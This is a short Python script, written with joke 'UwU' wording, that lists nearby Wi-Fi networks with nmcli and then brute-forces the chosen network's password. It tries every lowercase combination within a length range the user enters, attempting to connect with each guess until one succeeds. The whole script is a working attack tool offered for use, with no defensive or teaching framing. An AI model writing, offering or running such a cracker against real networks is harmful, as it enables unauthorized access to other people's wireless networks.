import itertools
import string
import time
import subprocess
import sys

animation_duration = 3 
end_time = time.time() + animation_duration

while time.time() < end_time:
    for char in '|/-\\':
        sys.stdout.write(f'\rLOwOding available netUwUrks... {char}')
        sys.stdout.flush()
        time.sleep(0.1)

sys.stdout.write('\rLOwOding complete!    \n') 

subprocess.run(['nmcli', 'device', 'wifi'])
network = input("Which netUwUrk to cryack? (Enter full netUwUrk name): ")

charset = string.ascii_lowercase
min_length = int(input("MiNYAmal passUwUrd lenght? (Enter int valUwUe): "))
max_length = int(input("Max passUwUrd lenght? (Enter int valUwUe): "))

for length in range(min_length, max_length + 1):
    for guess in itertools.product(charset, repeat=length):
        guess_password = ''.join(guess)
        print(f'Tryaing passUwUrd... {guess_password}')
        
        result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', network, 'password', guess_password], 
                                text=True, capture_output=True)

        if "successfully" in result.stdout:
            print(f'PassUwUrd was foUwUnd: {guess_password}! ^~^')
            break
    else:
        continue
    break
else:
    print("PassUwUrd wasn't foUwUnd... >~<")

try:
    if __name__ == "__main__":
        pass
except KeyboardInterrupt:
    print("bye...")